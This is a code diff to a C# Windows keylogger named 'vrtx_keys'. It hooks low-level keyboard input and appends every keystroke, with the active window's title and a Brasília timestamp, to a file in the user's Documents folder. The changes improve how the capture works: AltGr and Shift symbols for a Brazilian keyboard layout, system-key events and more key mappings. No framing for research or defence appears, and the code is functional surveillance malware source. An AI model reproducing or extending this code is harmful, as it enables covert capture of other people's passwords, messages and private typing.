@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Text;
+using System.Globalization;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.Windows.Forms;
@@ -9,14 +10,16 @@ namespace vrtx_keys {
     class KeyBoardListener {
         private static int WH_KEYBOARD_LL = 13;
         private static int WM_KEYDOWN = 0x0100;
-        private static int WM_KEYUP = 0x0101;
+        private static int WM_SYSKEYDOWN = 0x0104;
         private static int HC_ACTION = 0;
         private static int VK_SHIFT = 0x10;
         private static int VK_CAPITAL = 0x14;
+        private static int VK_RMENU = 0xA5;
 
         public static LowLevelKeyboardProc llkProcedure = HookCallback;
         private static bool capsPressed = GetKeyState(VK_CAPITAL);
         private static bool shiftPressed = GetKeyState(VK_SHIFT);
+        private static bool rAltPressed = GetKeyState(VK_RMENU);
         private static string FILEPATH = fileAccess(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments));
         private static IntPtr pfgw;
 
@@ -46,17 +49,26 @@ namespace vrtx_keys {
                     StringBuilder title = new StringBuilder("", 256);
 
                     if (pfgw != fgw) {
+
+                        // Brazil DateTime
+                        DateTime utcDateTime = DateTime.UtcNow;
+                        TimeZoneInfo brasiliaDateTimeInfo = TimeZoneInfo.FindSystemTimeZoneById("E. South America Standard Time");
+                        DateTime brzDateTime = TimeZoneInfo.ConvertTimeFromUtc(utcDateTime, brasiliaDateTimeInfo);
+
+                        // Window title
                         GetWindowText(fgw, title, 256);
-                        Console.Out.Write("\n[" + title.ToString() + "]\n");
-                        output.Write("\n[" + title.ToString() + "]\n");
+
+                        Console.Out.Write("\n[{0}] - GMT-3: {1}\n", title.ToString(), brzDateTime.ToString());
+                        output.Write("\n[{0}] - GMT-3: {1}\n", title.ToString(), brzDateTime.ToString());
+
+                        // ForegroundWindow updated
                         pfgw = fgw;
                     }
                 }
-
         
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                if(wParam == (IntPtr)WM_KEYDOWN) {
+                if(wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN){ 
                     if(vkCode == VK_CAPITAL)
                         capsPressed = !capsPressed;
 
@@ -78,41 +90,45 @@ namespace vrtx_keys {
             using (StreamWriter output = File.AppendText(FILEPATH)){
                 switch(((Keys)vkCode).ToString()){
 
+                    case "None": // None - vkCode: 0
+                        Console.Out.Write("");
+                        output.Write("");
+                    break;
+
                     case "Add": // NumPad
                         Console.Out.Write("+");
                         output.Write("+");
                     break;
 
-                    case "Apps":
-                        Console.Out.Write("{Apps}");
-                        output.Write("🤣");
+                    case "Apps": // Application key
+                        Console.Out.Write("[Apps]");
+                        output.Write("[≣ Menu]");
                     break;
 
                     case "Back": // Backspace
-                        Console.Out.Write("{BCKSP}");
-                        output.Write("{⟵ }");
+                        Console.Out.Write("[Backspace]");
+                        output.Write("[⟵ ]");
                     break;
 
-                    case "BrowserHome":
-                        Console.Out.Write("{BRWRHOME}");
-                        output.Write("{🏠}");
+                    case "BrowserHome": // Other shortcuts
+                        Console.Out.Write("[BrowserHome]");
+                        output.Write("[🏠]");
                     break;
 
-                    case "BrowserSearch":
-                        Console.Out.Write("{BRWRSEARCH}");
-                        output.Write("{⌕}");
+                    case "BrowserSearch": // Other shortcuts
+                        Console.Out.Write("[BrowserSearch]");
+                        output.Write("[⌕]");
                     break;
 
                     case "Capital": // Caps Lock
-                        Console.Out.Write("{CAPS}");
-                        output.Write("{Caps Lock}");
+                        Console.Out.Write("[Caps]");
+                        // output.Write("[Caps Lock]");
                     break;
 
                     case "Clear": // NumPad
-                        Console.Out.Write("{Clear(5)}");
+                        Console.Out.Write("[Clear(5)]");
                     break;
                     
-                    //tratar shift
                     case "D1": // Numerico
                         shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                         if(shiftPressed) {
@@ -223,17 +239,15 @@ namespace vrtx_keys {
                             output.Write("0");
                         }
                     break;
-                        
-                    break;
 
                     case "Decimal": // NumPad
                         Console.Out.Write(",");
                         output.Write(",");
                     break;
 
-                    case "Delete":
-                        Console.Out.Write("{DEL}");
-                        output.Write("{DEL}");
+                    case "Delete": // Control Pad
+                        Console.Out.Write("[Delete]");
+                        output.Write("[Delete]");
                     break;
                     
                     case "Divide": //NumPad
@@ -241,68 +255,73 @@ namespace vrtx_keys {
                         output.Write("/");
                     break;
 
-                    case "Down":
-                        Console.Out.Write("{ADOWN}");
-                        output.Write("{↓}");
+                    case "Down": // Arrow Pad
+                        Console.Out.Write("[ADown]");
+                        output.Write("[↓]");
                     break;
 
-                    case "End":
-                        Console.Out.Write("{END}");
-                        output.Write("{END}");
+                    case "End": // Control Pad
+                        Console.Out.Write("[End]");
+                        output.Write("[End]");
                     break;
 
-                    case "Escape": // Esc
-                        Console.Out.Write("{Esc}");
-                        output.Write("{Esc}");
+                    case "Escape":  // Function
+                        Console.Out.Write("[Esc]");
+                        output.Write("[Esc]");
                     break;
 
-                    case "F1":
-                    case "F2":
-                    case "F3":
-                    case "F4":
-                    case "F5":
-                    case "F6":
-                    case "F7":
-                    case "F8":
-                    case "F9":
-                    case "F10":
-                    case "F11":
-                    case "F12":
-                        Console.Out.Write("{" + (Keys)vkCode + "}");
-                        output.Write("{" + (Keys)vkCode + "}");
+                    case "F1": // Function
+                    case "F2": // Function
+                    case "F3": // Function
+                    case "F4": // Function
+                    case "F5": // Function
+                    case "F6": // Function
+                    case "F7": // Function
+                    case "F8": // Function
+                    case "F9": // Function
+                    case "F10": // Function
+                    case "F11": // Function
+                    case "F12": // Function
+                        Console.Out.Write("[" + (Keys)vkCode + "]");
+                        output.Write("[" + (Keys)vkCode + "]");
                     break;
 
-                    case "Home":
-                        Console.Out.Write("{Home}");
-                        output.Write("{Home}");
+                    case "Home": // Control Pad
+                        Console.Out.Write("[Home]");
+                        output.Write("[Home]");
                     break;
 
-                    case "Insert":
-                        Console.Out.Write("{Insert}");
-                        output.Write("{Insert}");
+                    case "Insert": // Control Pad
+                        Console.Out.Write("[Insert]");
+                        output.Write("[Insert]");
                     break;
 
-                    case "LaunchApplication1":
-                        Console.Out.Write("{MYCOMP}");
-                        output.Write("{💻}");
+                    case "LaunchApplication1": // Other shortcuts
+                        Console.Out.Write("[MyComp]");
+                        output.Write("[💻]");
                     break;
 
-                    case "LaunchMail":
-                        Console.Out.Write("{LaunchMail}"); 
-                        output.Write("{💻}");
+                    case "LaunchMail": // Other shortcuts
+                        Console.Out.Write("[LaunchMail]"); 
+                        output.Write("[✉️]");
                     break;
                     
-                    case "LButton, OemClear":
-                        Console.Out.Write("{BRIGHT_CONEC}");
-                        output.Write("{☼ / 🌐}");
+                    case "LButton, OemClear": // Other shortcuts
+                        Console.Out.Write("[BrightConec]");
+                        output.Write("[-🔅] [+🔅] [🌐]");
                     break;
 
                     //tratar altgr
-                    case "LButton, Oemtilde":
+                    case "LButton, Oemtilde": // Typewriter
                         shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
-                        if(shiftPressed) {
+                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
+                        if(shiftPressed){// & !rAltPressed) {
                             Console.Out.Write("?");
                             output.Write("?");
+                        }
+                        else if(rAltPressed & !shiftPressed){
+                            Console.Out.Write("°");
+                            output.Write("°");
                         }
                         else{
                             Console.Out.Write("/");
@@ -310,39 +329,49 @@ namespace vrtx_keys {
                         }                       
                     break;
 
-                    case "LControlKey":
-                        Console.Out.Write("{LCONTROL}");
-                        output.Write("{Ctrl}");
+                    case "LControlKeyRMenu": // Typewriter
+                        Console.Out.Write("[Alt Gr]");
+                        // output.Write("[Alt Gr]");
                     break;
 
-                    case "Left":
-                        Console.Out.Write("{ALEFT}");
-                        output.Write("{←}");
+                    case "LControlKey": // Typewriter
+                        Console.Out.Write("[LCtrl]");
+                        // output.Write("[Ctrl]");
                     break;
 
-                    case "LShiftKey":
-                        Console.Out.Write("{LSHIFT}");
-                        output.Write("{⇧Shift}");
+                    case "Left": // Arrow Pad
+                        Console.Out.Write("[ALeft]");
+                        output.Write("[←]");
                     break;
 
-                    case "LWin":
-                        Console.Out.Write("{LWIN}");
-                        output.Write("{⊞ Win}");
+                    case "LMenu": // Typewriter
+                        Console.Out.Write("[Alt]");
+                        // output.Write("[Alt]");
                     break;
 
-                    case "MediaNextTrack":
-                        Console.Out.Write("{MNEXTRACK}");
-                        output.Write("{⏭}");
+                    case "LShiftKey": // Typewriter
+                        Console.Out.Write("[LShift]");
+                        // output.Write("[⇧Shift]");
                     break;
 
-                    case "MediaPlayPause":
-                        Console.Out.Write("{MPLAYTRACK}");
-                        output.Write("{⏯}");
+                    case "LWin": // System
+                        Console.Out.Write("[LWin]");
+                        output.Write("[⊞ Win]");
                     break;
 
-                    case "MediaPreviousTrack":
-                        Console.Out.Write("{MPREVTRACK}");
-                        output.Write("{⏮}");
+                    case "MediaNextTrack": // Media shortcut
+                        Console.Out.Write("[MNextTrack]");
+                        output.Write("[⏭]");
+                    break;
+
+                    case "MediaPlayPause": // Media shortcut
+                        Console.Out.Write("[MPlayTrack]");
+                        output.Write("[⏯]");
+                    break;
+
+                    case "MediaPreviousTrack": // Media shortcut
+                        Console.Out.Write("[MPrevTrack]");
+                        output.Write("[⏮]");
                     break;
 
                     case "Multiply": // NumPad
@@ -351,24 +380,25 @@ namespace vrtx_keys {
                     break;
                     
                     case "NumLock": // NumPad
-                        Console.Out.Write("{NumLock}");
-                        output.Write("{NumLock}");
+                        Console.Out.Write("[NumLock]");
+                        output.Write("[NumLock]");
                     break;
+
                     case "NumPad1": // NumPad
-                    case "NumPad2":
-                    case "NumPad3":
-                    case "NumPad4":
-                    case "NumPad5":
-                    case "NumPad6":
-                    case "NumPad7":
-                    case "NumPad8":
-                    case "NumPad9":
-                    case "NumPad0":
+                    case "NumPad2": // NumPad
+                    case "NumPad3": // NumPad
+                    case "NumPad4": // NumPad
+                    case "NumPad5": // NumPad
+                    case "NumPad6": // NumPad
+                    case "NumPad7": // NumPad
+                    case "NumPad8": // NumPad
+                    case "NumPad9": // NumPad
+                    case "NumPad0": // NumPad
                         Console.Out.Write(((Keys)vkCode).ToString().Substring(6));
                         output.Write(((Keys)vkCode).ToString().Substring(6));
                     break;
                     
-                    case "Oem1":
+                    case "Oem1": // Typewriter
                         shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                         if(shiftPressed ^ capsPressed) {
                             Console.Out.Write("Ç");
@@ -380,86 +410,171 @@ namespace vrtx_keys {
                         }
                     break;
 
-                    //tratar shift e altgr
-                    case "Oem5":
-                        Console.Out.Write("]");
-                        output.Write("]");
+                    case "Oem5": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
+                        if(shiftPressed & !rAltPressed) {
+                            Console.Out.Write("}");
+                            output.Write("}");
+                        }
+                        else if(rAltPressed & !shiftPressed){
+                            Console.Out.Write("º");
+                            output.Write("º");
+                        }
+                        else{
+                            Console.Out.Write("]");
+                            output.Write("]");
+                        } 
+                        
                     break;
 
-                    //tratar shift e altgr
-                    case "Oem6":
-                        Console.Out.Write("[");
-                        output.Write("[");
+                    case "Oem6": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
+                        if(shiftPressed & !rAltPressed) {
+                            Console.Out.Write("{");
+                            output.Write("{");
+                        }
+                        else if(rAltPressed & !shiftPressed){
+                            Console.Out.Write("ª");
+                            output.Write("ª");
+                        }
+                        else{
+                            Console.Out.Write("[");
+                            output.Write("[");
+                        }                         
                     break;
 
-                    //tratar shift e acentuação
-                    case "Oem7":
-                        Console.Out.Write("{WIP}");
-                        output.Write("{WIP}");
+                    case "Oem7": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write("^");
+                            output.Write("^");
+                        }
+                        else{
+                            Console.Out.Write("~");
+                            output.Write("~");
+                        }
+                    break;
+
+                    case "OemBackslash": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write("|");
+                            output.Write("|");
+                        }
+                        else{
+                            Console.Out.Write("\\");
+                            output.Write("\\");
+                        }
+                    break;
+
+                    case "Oemcomma": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write("<");
+                            output.Write("<");
+                        }
+                        else{
+                            Console.Out.Write(",");
+                            output.Write(",");
+                        } 
+                    break;
+
+                    case "OemMinus": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write("_");
+                            output.Write("_");
+                        }
+                        else{
+                            Console.Out.Write("-");
+                            output.Write("-");
+                        }
+                    break;
+
+                    case "OemOpenBrackets": // Typewriter
+                        if(shiftPressed) {
+                            Console.Out.Write("`");
+                            output.Write("`");
+                        }
+                        else{
+                            Console.Out.Write("´");
+                            output.Write("´");
+                        }
+                    break;
+
+                    case "OemPeriod": // Typewriter
+                        if(shiftPressed) {
+                            Console.Out.Write(">");
+                            output.Write(">");
+                        }
+                        else{
+                            Console.Out.Write(".");
+                            output.Write(".");
+                        }
+                    break;
+
+                    case "Oemplus": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
+                        if(shiftPressed & !rAltPressed) {
+                            Console.Out.Write("+");
+                            output.Write("+");
+                        }
+                        else if(rAltPressed & !shiftPressed){
+                            Console.Out.Write("§");
+                            output.Write("§");
+                        }
+                        else{
+                            Console.Out.Write("=");
+                            output.Write("=");
+                        }
                     break;
 
                     //tratar shift
-                    case "OemBackslash":
-                        Console.Out.Write("\\");
-                        output.Write("\\");
+                    case "OemQuestion": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write(":");
+                            output.Write(":");
+                        }
+                        else{
+                            Console.Out.Write(";");
+                            output.Write(";");
+                        }
                     break;
 
-                    //tratar shift e altgr
-                    case "Oemcomma":
-                        Console.Out.Write(",");
-                        output.Write(",");
-                    break;
-
-                    //tratar shift
-                    case "OemMinus":
-                        Console.Out.Write("-");
-                        output.Write("-");
-                    break;
-
-                    //tratar shift e acentuação
-                    case "OemOpenBrackets":
-                        Console.Out.Write("{WIP}");
-                        output.Write("{WIP}");
-                    break;
-
-                    //tratar shift e altgr
-                    case "OemPeriod":
-                        Console.Out.Write(".");
-                        output.Write(".");
-                    break;
-
-                    //tratar shift e altgr
-                    case "Oemplus":
-                        Console.Out.Write("=");
-                        output.Write("=");
-                    break;
-
-                    //tratar shift
-                    case "OemQuestion":
-                        Console.Out.Write(";");
-                        output.Write(";");
-                    break;
-
-                    //tratar shift
-                    case "Oemtilde":
-                        Console.Out.Write("'");
-                        output.Write("'");
+                    case "Oemtilde": // Typewriter
+                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
+                        if(shiftPressed) {
+                            Console.Out.Write("\"");
+                            output.Write("\"");
+                        }
+                        else{
+                            Console.Out.Write("'");
+                            output.Write("'");
+                        }
                     break;
                     
-                    // PGDOWN
-                    case "Next": 
-                        Console.Out.Write("{PGDOWN}");
-                        output.Write("{PGDOWN}");
+                    case "Next": // PGDOWN // Control Pad
+                        Console.Out.Write("[PageDown]");
+                        output.Write("[PageDown]");
                     break;
 
-                    case "PageUp":
-                        Console.Out.Write("{PGUP}");
-                        output.Write("{PGUP}");
+                    case "PageUp": // Control Pad
+                        Console.Out.Write("[PageUp]");
+                        output.Write("[PageUp]");
                     break;
 
-                    case "PrintScreen":
-                        Console.Out.Write("{PRTSCR}");
-                        output.Write("{PRTSCR}");
+                    case "Pause": // Control Pad
+                        Console.Out.Write("[PauseBreak]");
+                        output.Write("[PauseBreak]");
+                    break;
+
+                    case "PrintScreen": // Control Pad
+                        Console.Out.Write("[PrintScreen]");
+                        output.Write("[PrintScreen]");
                     break;
 
                     case "RButton, Oemtilde": // NumPad
@@ -467,27 +582,43 @@ namespace vrtx_keys {
                         output.Write(".");
                     break;
 
-                    case "RControlKey":
-                        Console.Out.Write("{RCONTROL}");
-                        output.Write("{RCONTROL}");
+                    case "RControlKey": // Typewriter
+                        Console.Out.Write("[RCtrl]");
+                        // output.Write("[Ctrl]");
                     break;   
 
-                    case "Return":
+                    case "Return": // Typewriter
                         Console.Out.Write("\n");
                         output.Write("\n");
                     break;
 
-                    case "Right":
-                        Console.Out.Write("{ARIGHT}");
-                        output.Write("{ARIGHT}");
+                    case "Right": // Arrow Pad
+                        Console.Out.Write("[ARight]");
+                        output.Write("[→]");
                     break;
 
-                    case "RShiftKey":
-                        Console.Out.Write("{RSHIFT}");
-                        output.Write("{RSHIFT}");
+                    case "RMenu": // Typewriter
+                        Console.Out.Write("[RAlt]");
+                        // output.Write("[RAlt]");
+                    break;
+
+
+                    case "RShiftKey": // Typewriter
+                        Console.Out.Write("[RShift]");
+                        // output.Write("[⇧Shift]");
+                    break; 
+
+                    case "RWin": // System
+                        Console.Out.Write("[RWin]");
+                        output.Write("[⊞ Win]");
+                    break;
+
+                    case "Scroll": // Control Pad
+                        Console.Out.Write("[ScrollLock]");
+                        output.Write("[ScrollLock]");
                     break; 
                     
-                    case "Space":
+                    case "Space": // Typewriter
                         Console.Out.Write(" ");
                         output.Write(" ");
                     break;
@@ -497,29 +628,29 @@ namespace vrtx_keys {
                         output.Write("-");
                     break;
 
-                    case "Tab":
-                        Console.Out.Write("{TAB}");
-                        output.Write("{TAB}");
+                    case "Tab": // Typewriter
+                        Console.Out.Write("[Tab]");
+                        output.Write("    ");
                     break;
 
-                    case "Up":
-                        Console.Out.Write("{AUP}");
-                        output.Write("{AUP}");
+                    case "Up": // Arrow Pad
+                        Console.Out.Write("[AUp]");
+                        output.Write("[↑]");
                     break;
 
-                    case "VolumeDown":
-                        Console.Out.Write("{VOLDOWN}");
-                        output.Write("{VOLDOWN}");
+                    case "VolumeDown": // Media shortcut
+                        Console.Out.Write("[VolDown]");
+                        output.Write("[🔉]");
                     break;
 
-                    case "VolumeMute":
-                        Console.Out.Write("{VOLMUTE}");
-                        output.Write("{VOLMUTE}");
+                    case "VolumeMute": // Media shortcut
+                        Console.Out.Write("[VolMute]");
+                        output.Write("[🔇]");
                     break;
 
-                    case "VolumeUp":
-                        Console.Out.Write("{VOLUP}");
-                        output.Write("{VOLUP}");
+                    case "VolumeUp": // Media shortcut
+                        Console.Out.Write("[VolUp]");
+                        output.Write("[🔊]");
                     break;
 
                     default:
